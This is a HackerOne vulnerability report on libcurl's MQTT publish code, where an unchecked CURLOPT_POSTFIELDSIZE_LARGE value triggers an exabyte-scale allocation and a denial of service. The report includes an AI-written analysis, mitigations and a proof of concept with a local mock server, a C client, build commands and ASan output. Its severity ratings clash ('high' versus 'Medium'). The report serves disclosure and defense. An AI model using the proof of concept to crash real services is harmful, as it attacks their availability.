# libcurl MQTT CURLOPT_POSTFIELDSIZE_LARGE Overflow Leads to Immediate DoS

## Metadata
- **Source:** HackerOne
- **Report:** 3417428 | https://hackerone.com/reports/3417428
- **Submitted:** 2025-11-09
- **Reporter:** jiyong
- **Program:** libcurl
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Integer Overflow, Improper Input Validation, Denial of Service, Memory Exhaustion
- **CVEs:** None
- **Category:** uncategorised

## Summary
libcurl's MQTT publish functionality fails to validate the CURLOPT_POSTFIELDSIZE_LARGE option against MQTT protocol limits (268,435,455 bytes) and does not check for arithmetic overflow. An attacker can supply an excessively large size value to trigger an allocation failure, causing immediate process abort via AddressSanitizer or CURLE_OUT_OF_MEMORY errors that crash applications.

## Attack scenario
1. Attacker identifies a service using libcurl with MQTT support that accepts user-controlled message size parameters
2. Attacker sets CURLOPT_POSTFIELDSIZE_LARGE to an extremely large value (e.g., 2^62 bytes, ~4 exabytes)
3. Application calls curl_easy_setopt() with the attacker-controlled size without sanitization
4. curl_easy_perform() is invoked, which internally calls mqtt_publish()
5. mqtt_publish() calculates remaining length as payloadlen + topiclen + 2 without overflow checks or MQTT spec validation
6. malloc() attempt for remaininglength + 1 + encodelen fails, triggering process abort (ASan) or fatal error handling, causing Denial of Service

## Root cause
The mqtt_publish() function in lib/mqtt.c trusts the CURLOPT_POSTFIELDSIZE_LARGE value without validation against MQTT's maximum remaining length specification (0x0FFFFFFF = 268,435,455 bytes) and lacks arithmetic overflow protection. The calculated buffer size exceeds system allocation limits, causing malloc() to fail catastrophically.

## Attacker mindset
Attacker recognizes that MQTT client applications often treat allocation failures as fatal errors and lack input validation on protocol-level size constraints. By exploiting the gap between user-supplied parameters and protocol specifications, a trivial single-request attack can crash any dependent service without authentication or prior compromise.

## Defensive takeaways
- Validate all user-supplied size parameters against protocol-specific maximum values (MQTT max remaining length: 268,435,455)
- Implement explicit overflow checks before arithmetic operations on size values (payloadlen + topiclen + 2)
- Add guard clauses that reject oversized allocations before calling malloc()
- Use safe integer arithmetic libraries to prevent silent overflow
- Sanitize and bound external input at API boundaries, not just internally
- Test with both normal and pathological inputs, especially values near 2^32 and 2^64
- Consider implementing allocation size limits as a defense-in-depth measure

## Variant hunting
Search for similar unchecked malloc() calls in protocol handlers (HTTP, FTP, SMTP, etc.) where user input influences buffer sizes
Review all curl_off_t and size_t arithmetic operations in protocol implementations for overflow potential
Audit other CURLOPT_*FIELDSIZE(_LARGE) options for similar validation gaps
Test against protocol specifications to ensure libcurl enforces stated limits
Examine error handling paths: does NULL malloc() return get properly propagated or ignored?
Check if similar issues exist in wrapper allocators (curl_malloc, etc.)

## MITRE ATT&CK
- T1499
- T1561
- T1561.001

## Notes
This is a straightforward denial-of-service vulnerability requiring no authentication. The PoC is minimal and reliable. The vulnerability highlights the importance of validating external input against protocol specifications, not just system limits. Severity is elevated in production environments where MQTT client crashes impact service availability. The fix should include both input validation and overflow checks.

## Full report
<details><summary>Expand</summary>

## Summary
An attacker can crash or forcefully abort any application that uses libcurl's MQTT support by setting an excessively large value for `CURLOPT_POSTFIELDSIZE_LARGE`. The MQTT publish logic (`lib/mqtt.c::mqtt_publish`) trusts this value without validating it against the protocol's maximum remaining length (268,435,455) and without checking for arithmetic overflow. As a result, it attempts to allocate an impossibly large buffer (several exabytes) and immediately fails with either an abort (AddressSanitizer) or a `CURLE_OUT_OF_MEMORY` error, terminating the process and causing a Denial of Service.

## Impact
- **Availability:** Any service that allows untrusted input to influence `CURLOPT_POSTFIELDSIZE(_LARGE)`—for example, user-controlled message lengths or proxied MQTT requests—can be brought down instantly. A single malicious request is enough to trigger the crash.
- **Stability:** Even in non-ASan builds, the call consistently returns `CURLE_OUT_OF_MEMORY`; applications that treat this as fatal (common for MQTT producers) will shut down. When compiled with sanitizers, the process aborts on the spot due to an "allocation-size-too-big" assertion.
- **Scope:** No authentication or man-in-the-middle capability is required. Simply making the client construct a publish request with a massive length triggers the bug.

## Attack Scenario
1. The attacker convinces a libcurl-based MQTT client or gateway to publish a message whose size field is set to ~4 exabytes (or any value over 0x0FFFFFFF).
2. The client calls `curl_easy_setopt(handle, CURLOPT_POSTFIELDSIZE_LARGE, huge_value)` and eventually invokes `curl_easy_perform()`.
3. Inside `mqtt_publish`, libcurl calculates the MQTT remaining length as `payloadlen + topiclen + 2`, which wraps or exceeds the MQTT specification limit. It then calls `malloc(remaininglength + 1 + encodelen)`.
4. `malloc()` cannot satisfy the request and aborts (ASan) or returns NULL (if `allocator_may_return_null=1`). In either case, the application dies or enters a failure state, causing a denial of service without ever sending the payload to the broker.

## Proof of Concept
Two files are needed: a minimal MQTT mock server and a client PoC that sets an oversized payload length.

### `mqtt_server.py`
```python
import socket

HOST, PORT = "127.0.0.1", 1883
CONNACK = b"\x20\x02\x00\x00"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[server] listening on {HOST}:{PORT}")
    conn, addr = s.accept()
    with conn:
        print(f"[server] accepted connection from {addr}")
        data = conn.recv(1024)
        print(f"[server] received {len(data)} bytes")
        conn.sendall(CONNACK)
        print("[server] sent CONNACK")
        conn.recv(1024)
        print("[server] received publish (possibly truncated)")
```

### `mqtt_overflow.c`
```c
#include <curl/curl.h>
#include <stdio.h>

int main(void)
{
  CURL *curl = curl_easy_init();
  if(!curl) {
    fprintf(stderr, "curl_easy_init failed\n");
    return 1;
  }

  const char payload[] = "X";                       /* actual data: 1 byte */
  const curl_off_t fake_size = ((curl_off_t)1 << 62); /* advertise ~4 EB */

  curl_easy_setopt(curl, CURLOPT_URL, "mqtt://127.0.0.1:1883/topic");
  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
  curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE_LARGE, fake_size);
  curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT_MS, 2000L);
  curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 3000L);
  curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

  fprintf(stderr, "[*] requesting payload size: %lld\n", (long long)fake_size);

  CURLcode res = curl_easy_perform(curl);
  fprintf(stderr, "curl_easy_perform: %d\n", res);

  curl_easy_cleanup(curl);
  return (int)res;
}
```

### Build & Run
```bash
# Configure and build libcurl with MQTT enabled (example using CMake)
cmake -S . -B build-mqtt -DCMAKE_BUILD_TYPE=Debug -DCURL_USE_LIBPSL=OFF
cmake --build build-mqtt --target libcurl_shared -- -j8

# Compile PoC with AddressSanitizer
clang -fsanitize=address -Iinclude -Ibuild-mqtt/lib \
  -Lbuild-mqtt/lib -Wl,-rpath,build-mqtt/lib \
  build-mqtt/poc/mqtt_overflow.c -lcurl-d -o build-mqtt/poc/mqtt_overflow

# Launch mock server and execute PoC
python3 build-mqtt/poc/mqtt_server.py &
build-mqtt/poc/mqtt_overflow
```

### Observed Output (ASan build)
```
[*] requesting payload size: 4611686018427387904
*   Trying 127.0.0.1:1883...
* Established connection to 127.0.0.1 (127.0.0.1 port 1883) from 127.0.0.1 port 62013 
* Using client id 'curlgqXILtsX'
==12584==ERROR: AddressSanitizer: requested allocation size 0x400000000000000c ...
SUMMARY: AddressSanitizer: allocation-size-too-big mqtt.c:616 in mqtt_publish
==12584==ABORTING
```

### Observed Output (allocator may return NULL)
```
$ ASAN_OPTIONS=allocator_may_return_null=1 build-mqtt/poc/mqtt_overflow
[*] requesting payload size: 4611686018427387904
==13457==WARNING: AddressSanitizer failed to allocate 0x400000000000000c bytes
curl_easy_perform: 27
```

The mock server log confirms that the connection is opened, a CONNACK is returned, and the client terminates immediately while trying to publish.

## Root Cause
Excerpt from `lib/mqtt.c`:
```c
remaininglength = payloadlen + 2 + topiclen;
encodelen = mqtt_encode_len(encodedbytes, remaininglength);

pkt = malloc(remaininglength + 1 + encodelen);
if(!pkt) {
  result = CURLE_OUT_OF_MEMORY;
  goto fail;
}
...
memcpy(&pkt[i], payload, payloadlen);
```
- `payloadlen` comes directly from `CURLOPT_POSTFIELDSIZE_LARGE`.
- There is no check that `payloadlen` stays within the MQTT specification (maximum remaining length 0x0FFFFFFF) or within any safe memory bounds.
- `remaininglength + 1 + encodelen` is computed in `size_t`, so it can wrap or exceed practical memory limits.
- On failure, the function never reaches the publish stage, effectively crashing the client before any data is sent.

## Recommended Mitigation
1. **Validate `payloadlen`:** Reject any request where `payloadlen > 0x0FFFFFFF - (topiclen + 2)` and return `CURLE_BAD_FUNCTION_ARGUMENT`.
2. **Overflow Guard:** Before calling `malloc`, ensure the sum `remaininglength + 1 + encodelen` cannot overflow and fits within a reasonable bound.
3. **Protocol Compliance:** Consider capping `mqtt_encode_len` to 4 bytes and aborting if the encoded length would exceed MQTT's remaining length limit.
4. **Regression Test:** Add a unit or integration test that attempts to set an oversized `CURLOPT_POSTFIELDSIZE_LARGE` and ensures the call fails gracefully.

## Environment
- macOS 15.0 (24A335)
- Apple Clang 17.0.0.17000319
- curl 8.17.1-dev (CMake build with MQTT enabled)
- AddressSanitizer (default settings) and libc runtime without ASan

## Severity
Medium — Denial of Service via integer overflow / uncontrolled resource consumption (CWE-190 / CWE-400).

## References
- MQTT Specification (v3.1.1) — Remaining Length field is limited to 268,435,455
- curl security program: <https://hackerone.com/curl>

## Impact

- Remote attacker can forcefully terminate any libcurl-based MQTT client or service by advertising an oversized MQTT payload.
- The malformed request causes libcurl to attempt an allocation of several exabytes, which immediately aborts the process (ASan) or returns CURLE_OUT_OF_MEMORY, effectively denying service.
- No authentication or special network position is required; a single malicious publish request suffices to crash the application.

</details>

---
*Analysed by Claude on 2026-05-24*
